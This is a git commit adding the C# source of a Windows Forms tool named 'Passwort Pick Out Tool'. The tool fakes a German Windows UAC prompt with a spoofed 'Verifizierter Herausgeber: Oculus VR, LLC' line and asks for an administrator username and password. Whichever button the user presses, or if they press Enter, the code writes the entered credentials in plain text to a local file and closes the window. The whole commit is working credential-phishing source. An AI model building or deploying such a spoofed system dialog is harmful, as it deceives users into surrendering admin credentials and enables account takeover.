7e93254d651037f168625065b893908c6ea058b5
Fethi Isfarca <fisfarca@googlemail.com>
2019-02-07 22:32:54 +0100

    Adding project.

---
+++ Passwort Pick Out Tool/Passwort Pick Out Tool/Benutzerkontensteuerung.Designer.cs
@@ -0,0 +1,309 @@
+﻿namespace Passwort_Pick_Out_Tool
+{
+    partial class FormBenutzerkontensteuerung
+    {
+        /// <summary>
+        /// Erforderliche Designervariable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Verwendete Ressourcen bereinigen.
+        /// </summary>
+        /// <param name="disposing">True, wenn verwaltete Ressourcen gelöscht werden sollen; andernfalls False.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Vom Windows Form-Designer generierter Code
+
+        /// <summary>
+        /// Erforderliche Methode für die Designerunterstützung.
+        /// Der Inhalt der Methode darf nicht mit dem Code-Editor geändert werden.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormBenutzerkontensteuerung));
+            this.ListboxTitleBarColor = new System.Windows.Forms.ListBox();
+            this.LabelBenutzerkontensteuerung = new System.Windows.Forms.Label();
+            this.LabelClose = new System.Windows.Forms.Label();
+            this.LabelTitleBarIndex1 = new System.Windows.Forms.Label();
+            this.LabelTitleBarIndex2 = new System.Windows.Forms.Label();
+            this.LabelTitleBarIndex3 = new System.Windows.Forms.Label();
+            this.PictureBoxZendStudioLogo = new System.Windows.Forms.PictureBox();
+            this.LabelZendStudio = new System.Windows.Forms.Label();
+            this.LabelVerifizierterHerausgeber = new System.Windows.Forms.Label();
+            this.LabelDateiursprung = new System.Windows.Forms.Label();
+            this.LabelWeitereDetailsAnzeigen = new System.Windows.Forms.Label();
+            this.LabelBodyIndex0 = new System.Windows.Forms.Label();
+            this.LabelBodyIndex1 = new System.Windows.Forms.Label();
+            this.TextboxPassword = new System.Windows.Forms.TextBox();
+            this.LabelPCname = new System.Windows.Forms.Label();
+            this.ButtonJa = new System.Windows.Forms.Button();
+            this.ButtonNein = new System.Windows.Forms.Button();
+            this.TextboxBenutzername = new System.Windows.Forms.TextBox();
+            ((System.ComponentModel.ISupportInitialize)(this.PictureBoxZendStudioLogo)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // ListboxTitleBarColor
+            // 
+            this.ListboxTitleBarColor.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.ListboxTitleBarColor.FormattingEnabled = true;
+            this.ListboxTitleBarColor.Location = new System.Drawing.Point(-4, -30);
+            this.ListboxTitleBarColor.Name = "ListboxTitleBarColor";
+            this.ListboxTitleBarColor.Size = new System.Drawing.Size(528, 160);
+            this.ListboxTitleBarColor.TabIndex = 0;
+            // 
+            // LabelBenutzerkontensteuerung
+            // 
+            this.LabelBenutzerkontensteuerung.AutoSize = true;
+            this.LabelBenutzerkontensteuerung.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.LabelBenutzerkontensteuerung.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelBenutzerkontensteuerung.Location = new System.Drawing.Point(12, 9);
+            this.LabelBenutzerkontensteuerung.Name = "LabelBenutzerkontensteuerung";
+            this.LabelBenutzerkontensteuerung.Size = new System.Drawing.Size(148, 15);
+            this.LabelBenutzerkontensteuerung.TabIndex = 4;
+            this.LabelBenutzerkontensteuerung.Text = "Benutzerkontensteuerung";
+            // 
+            // LabelClose
+            // 
+            this.LabelClose.AutoSize = true;
+            this.LabelClose.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.LabelClose.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelClose.Location = new System.Drawing.Point(489, 9);
+            this.LabelClose.Name = "LabelClose";
+            this.LabelClose.Size = new System.Drawing.Size(20, 20);
+            this.LabelClose.TabIndex = 5;
+            this.LabelClose.Text = "X";
+            this.LabelClose.Click += new System.EventHandler(this.LabelClose_Click);
+            // 
+            // LabelTitleBarIndex1
+            // 
+            this.LabelTitleBarIndex1.AutoSize = true;
+            this.LabelTitleBarIndex1.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.LabelTitleBarIndex1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelTitleBarIndex1.Location = new System.Drawing.Point(10, 43);
+            this.LabelTitleBarIndex1.Name = "LabelTitleBarIndex1";
+            this.LabelTitleBarIndex1.Size = new System.Drawing.Size(444, 25);
+            this.LabelTitleBarIndex1.TabIndex = 6;
+            this.LabelTitleBarIndex1.Text = "Möchten Sie zulassen, dass durch diese App";
+            // 
+            // LabelTitleBarIndex2
+            // 
+            this.LabelTitleBarIndex2.AutoSize = true;
+            this.LabelTitleBarIndex2.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.LabelTitleBarIndex2.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelTitleBarIndex2.Location = new System.Drawing.Point(12, 68);
+            this.LabelTitleBarIndex2.Name = "LabelTitleBarIndex2";
+            this.LabelTitleBarIndex2.Size = new System.Drawing.Size(419, 25);
+            this.LabelTitleBarIndex2.TabIndex = 7;
+            this.LabelTitleBarIndex2.Text = "Änderungen an Ihrem Gerät vorgenommen";
+            // 
+            // LabelTitleBarIndex3
+            // 
+            this.LabelTitleBarIndex3.AutoSize = true;
+            this.LabelTitleBarIndex3.BackColor = System.Drawing.SystemColors.MenuHighlight;
+            this.LabelTitleBarIndex3.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelTitleBarIndex3.Location = new System.Drawing.Point(12, 93);
+            this.LabelTitleBarIndex3.Name = "LabelTitleBarIndex3";
+            this.LabelTitleBarIndex3.Size = new System.Drawing.Size(94, 25);
+            this.LabelTitleBarIndex3.TabIndex = 8;
+            this.LabelTitleBarIndex3.Text = "werden?";
+            // 
+            // PictureBoxZendStudioLogo
+            // 
+            this.PictureBoxZendStudioLogo.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.PictureBoxZendStudioLogo.Image = ((System.Drawing.Image)(resources.GetObject("PictureBoxZendStudioLogo.Image")));
+            this.PictureBoxZendStudioLogo.Location = new System.Drawing.Point(26, 156);
+            this.PictureBoxZendStudioLogo.Name = "PictureBoxZendStudioLogo";
+            this.PictureBoxZendStudioLogo.Size = new System.Drawing.Size(51, 49);
+            this.PictureBoxZendStudioLogo.TabIndex = 6;
+            this.PictureBoxZendStudioLogo.TabStop = false;
+            // 
+            // LabelZendStudio
+            // 
+            this.LabelZendStudio.AutoSize = true;
+            this.LabelZendStudio.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelZendStudio.Location = new System.Drawing.Point(83, 170);
+            this.LabelZendStudio.Name = "LabelZendStudio";
+            this.LabelZendStudio.Size = new System.Drawing.Size(58, 20);
+            this.LabelZendStudio.TabIndex = 9;
+            this.LabelZendStudio.Text = "Oculus";
+            // 
+            // LabelVerifizierterHerausgeber
+            // 
+            this.LabelVerifizierterHerausgeber.AutoSize = true;
+            this.LabelVerifizierterHerausgeber.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelVerifizierterHerausgeber.Location = new System.Drawing.Point(23, 234);
+            this.LabelVerifizierterHerausgeber.Name = "LabelVerifizierterHerausgeber";
+            this.LabelVerifizierterHerausgeber.Size = new System.Drawing.Size(255, 16);
+            this.LabelVerifizierterHerausgeber.TabIndex = 10;
+            this.LabelVerifizierterHerausgeber.Text = "Verifizierter Herausgeber: Oculus VR, LLC";
+            // 
+            // LabelDateiursprung
+            // 
+            this.LabelDateiursprung.AutoSize = true;
+            this.LabelDateiursprung.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelDateiursprung.Location = new System.Drawing.Point(23, 250);
+            this.LabelDateiursprung.Name = "LabelDateiursprung";
+            this.LabelDateiursprung.Size = new System.Drawing.Size(287, 16);
+            this.LabelDateiursprung.TabIndex = 11;
+            this.LabelDateiursprung.Text = "Dateiursprung: Festplatte auf diesem Computer";
+            // 
+            // LabelWeitereDetailsAnzeigen
+            // 
+            this.LabelWeitereDetailsAnzeigen.AutoSize = true;
+            this.LabelWeitereDetailsAnzeigen.BackColor = System.Drawing.SystemColors.Control;
+            this.LabelWeitereDetailsAnzeigen.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelWeitereDetailsAnzeigen.ForeColor = System.Drawing.SystemColors.MenuHighlight;
+            this.LabelWeitereDetailsAnzeigen.Location = new System.Drawing.Point(23, 305);
+            this.LabelWeitereDetailsAnzeigen.Name = "LabelWeitereDetailsAnzeigen";
+            this.LabelWeitereDetailsAnzeigen.Size = new System.Drawing.Size(158, 16);
+            this.LabelWeitereDetailsAnzeigen.TabIndex = 12;
+            this.LabelWeitereDetailsAnzeigen.Text = "Weitere Details anzeigen";
+            // 
+            // LabelBodyIndex0
+            // 
+            this.LabelBodyIndex0.AutoSize = true;
+            this.LabelBodyIndex0.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelBodyIndex0.Location = new System.Drawing.Point(23, 335);
+            this.LabelBodyIndex0.Name = "LabelBodyIndex0";
+            this.LabelBodyIndex0.Size = new System.Drawing.Size(327, 16);
+            this.LabelBodyIndex0.TabIndex = 13;
+            this.LabelBodyIndex0.Text = "Geben Sie einen Administratorbenutzernamen und ein";
+            // 
+            // LabelBodyIndex1
+            // 
+            this.LabelBodyIndex1.AutoSize = true;
+            this.LabelBodyIndex1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelBodyIndex1.Location = new System.Drawing.Point(23, 351);
+            this.LabelBodyIndex1.Name = "LabelBodyIndex1";
+            this.LabelBodyIndex1.Size = new System.Drawing.Size(341, 16);
+            this.LabelBodyIndex1.TabIndex = 14;
+            this.LabelBodyIndex1.Text = "zugehöriges Kennwort ein, um den Vorgang fortzusetzen.";
+            // 
+            // TextboxPassword
+            // 
+            this.TextboxPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.TextboxPassword.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.TextboxPassword.Location = new System.Drawing.Point(26, 424);
+            this.TextboxPassword.Name = "TextboxPassword";
+            this.TextboxPassword.Size = new System.Drawing.Size(258, 22);
+            this.TextboxPassword.TabIndex = 1;
+            this.TextboxPassword.Enter += new System.EventHandler(this.TextboxPassword_Enter);
+            this.TextboxPassword.KeyUp += new System.Windows.Forms.KeyEventHandler(this.TextboxPassword_KeyUp);
+            this.TextboxPassword.Leave += new System.EventHandler(this.TextboxPassword_Leave);
+            // 
+            // LabelPCname
+            // 
+            this.LabelPCname.AutoSize = true;
+            this.LabelPCname.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.LabelPCname.Location = new System.Drawing.Point(23, 461);
+            this.LabelPCname.Name = "LabelPCname";
+            this.LabelPCname.Size = new System.Drawing.Size(83, 16);
+            this.LabelPCname.TabIndex = 15;
+            this.LabelPCname.Text = "Domäne: BK";
+            // 
+            // ButtonJa
+            // 
+            this.ButtonJa.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.ButtonJa.Location = new System.Drawing.Point(26, 553);
+            this.ButtonJa.Name = "ButtonJa";
+            this.ButtonJa.Size = new System.Drawing.Size(232, 32);
+            this.ButtonJa.TabIndex = 2;
+            this.ButtonJa.Text = "Ja";
+            this.ButtonJa.UseVisualStyleBackColor = true;
+            this.ButtonJa.Click += new System.EventHandler(this.ButtonJa_Click);
+            // 
+            // ButtonNein
+            // 
+            this.ButtonNein.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.ButtonNein.Location = new System.Drawing.Point(264, 553);
+            this.ButtonNein.Name = "ButtonNein";
+            this.ButtonNein.Size = new System.Drawing.Size(235, 32);
+            this.ButtonNein.TabIndex = 3;
+            this.ButtonNein.Text = "Nein";
+            this.ButtonNein.UseVisualStyleBackColor = true;
+            this.ButtonNein.Click += new System.EventHandler(this.ButtonNein_Click);
+            // 
+            // TextboxBenutzername
+            // 
+            this.TextboxBenutzername.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.TextboxBenutzername.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.TextboxBenutzername.Location = new System.Drawing.Point(26, 396);
+            this.TextboxBenutzername.Name = "TextboxBenutzername";
+            this.TextboxBenutzername.Size = new System.Drawing.Size(258, 22);
+            this.TextboxBenutzername.TabIndex = 0;
+            this.TextboxBenutzername.Enter += new System.EventHandler(this.TextboxBenutzername_Enter);
+            this.TextboxBenutzername.Leave += new System.EventHandler(this.TextboxBenutzername_Leave);
+            // 
+            // FormBenutzerkontensteuerung
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.Control;
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.ClientSize = new System.Drawing.Size(521, 622);
+            this.Controls.Add(this.TextboxBenutzername);
+            this.Controls.Add(this.ButtonNein);
+            this.Controls.Add(this.ButtonJa);
+            this.Controls.Add(this.LabelPCname);
+            this.Controls.Add(this.TextboxPassword);
+            this.Controls.Add(this.LabelBodyIndex1);
+            this.Controls.Add(this.LabelBodyIndex0);
+            this.Controls.Add(this.LabelWeitereDetailsAnzeigen);
+            this.Controls.Add(this.LabelDateiursprung);
+            this.Controls.Add(this.LabelVerifizierterHerausgeber);
+            this.Controls.Add(this.LabelZendStudio);
+            this.Controls.Add(this.PictureBoxZendStudioLogo);
+            this.Controls.Add(this.LabelTitleBarIndex3);
+            this.Controls.Add(this.LabelTitleBarIndex2);
+            this.Controls.Add(this.LabelTitleBarIndex1);
+            this.Controls.Add(this.LabelClose);
+            this.Controls.Add(this.LabelBenutzerkontensteuerung);
+            this.Controls.Add(this.ListboxTitleBarColor);
+            this.DoubleBuffered = true;
+            this.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MaximumSize = new System.Drawing.Size(521, 622);
+            this.MinimizeBox = false;
+            this.MinimumSize = new System.Drawing.Size(521, 622);
+            this.Name = "FormBenutzerkontensteuerung";
+            this.ShowIcon = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Benutzerkontensteuerung";
+            ((System.ComponentModel.ISupportInitialize)(this.PictureBoxZendStudioLogo)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ListBox ListboxTitleBarColor;
+        private System.Windows.Forms.Label LabelBenutzerkontensteuerung;
+        private System.Windows.Forms.Label LabelClose;
+        private System.Windows.Forms.Label LabelTitleBarIndex1;
+        private System.Windows.Forms.Label LabelTitleBarIndex2;
+        private System.Windows.Forms.Label LabelTitleBarIndex3;
+        private System.Windows.Forms.PictureBox PictureBoxZendStudioLogo;
+        private System.Windows.Forms.Label LabelZendStudio;
+        private System.Windows.Forms.Label LabelVerifizierterHerausgeber;
+        private System.Windows.Forms.Label LabelDateiursprung;
+        private System.Windows.Forms.Label LabelWeitereDetailsAnzeigen;
+        private System.Windows.Forms.Label LabelBodyIndex0;
+        private System.Windows.Forms.Label LabelBodyIndex1;
+        private System.Windows.Forms.TextBox TextboxPassword;
+        private System.Windows.Forms.Label LabelPCname;
+        private System.Windows.Forms.Button ButtonJa;
+        private System.Windows.Forms.Button ButtonNein;
+        private System.Windows.Forms.TextBox TextboxBenutzername;
+    }
+}
+
---
+++ Passwort Pick Out Tool/Passwort Pick Out Tool/Benutzerkontensteuerung.cs
@@ -0,0 +1,121 @@
+﻿using System;
+using System.IO;
+using System.Drawing;
+using System.Windows.Forms;
+
+namespace Passwort_Pick_Out_Tool
+{
+    public partial class FormBenutzerkontensteuerung : Form
+    {
+        #region Initialize Component
+        public FormBenutzerkontensteuerung()
+        {
+            InitializeComponent();
+
+            // In the tab order, the "TextboxPassword" is set to 0!
+
+            /* 
+             * The "PasswordChar" is initially set because the "TextboxPassword" is initially selected and 
+             * therefore no condition under "TextboxPassword_Enter" and "TextboxPassword_Leave" applies.
+             */ 
+            TextboxPassword.PasswordChar = '*';
+        }
+        #endregion
+
+        #region LabelClose
+        private void LabelClose_Click(object sender, EventArgs e)
+        {
+            FileWriteLine();
+        }
+        #endregion
+
+        #region Clear/Set watermark for "TextboxBenutzername"
+        private void TextboxBenutzername_Enter(object sender, EventArgs e)
+        {
+            if (TextboxBenutzername.Text == "  Benutzername")
+            {
+                // Clear watermark.
+                TextboxBenutzername.ForeColor = SystemColors.WindowText;
+                TextboxBenutzername.Text = "";
+            }
+        }
+
+        private void TextboxBenutzername_Leave(object sender, EventArgs e)
+        {
+            if (TextboxBenutzername.Text == "")
+            {
+                // Set watermark.
+                TextboxBenutzername.ForeColor = SystemColors.GrayText;
+                TextboxBenutzername.Text = "  Benutzername";
+            }
+        }
+        #endregion
+
+        #region Clear/Set PasswordChar and watermark for "TextboxPassword"
+        private void TextboxPassword_Enter(object sender, EventArgs e)
+        {
+            if (TextboxPassword.Text == "  Kennwort")
+            {
+                TextboxPassword.PasswordChar = '*';
+
+                // Clear watermark.
+                TextboxPassword.ForeColor = SystemColors.WindowText;
+                TextboxPassword.Text = "";
+            }
+        }
+
+        private void TextboxPassword_Leave(object sender, EventArgs e)
+        {
+            if (TextboxPassword.Text == "")
+            {
+                TextboxPassword.PasswordChar = '\0';
+
+                // Set watermark.
+                TextboxPassword.ForeColor = SystemColors.GrayText;
+                TextboxPassword.Text = "  Kennwort";
+            }
+        }
+        #endregion
+
+        #region "Enter key press"-function
+        private void TextboxPassword_KeyUp(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+                FileWriteLine();
+        }
+        #endregion
+
+        #region "Button click"-functions
+        private void ButtonJa_Click(object sender, EventArgs e)
+        {
+            FileWriteLine();
+        }
+
+        private void ButtonNein_Click(object sender, EventArgs e)
+        {
+            FileWriteLine();
+        }
+        #endregion
+
+        #region Write text from "TextboxPassword" in file
+        private void FileWriteLine()
+        {
+            // Declare Variable
+            StreamWriter File = new StreamWriter(@"D:\ddd\README.txt", true);
+
+            // Write text from "TextboxPassword" in file and close the file.
+            File.WriteLine
+            (
+                Environment.NewLine +
+                "Benutzername: " + TextboxBenutzername.Text 
+                + Environment.NewLine +
+                "Kennwort: " + TextboxPassword.Text
+            );
+            File.Close();
+
+            // Close Program
+            this.Close();
+        }
+        #endregion
+    }
+}
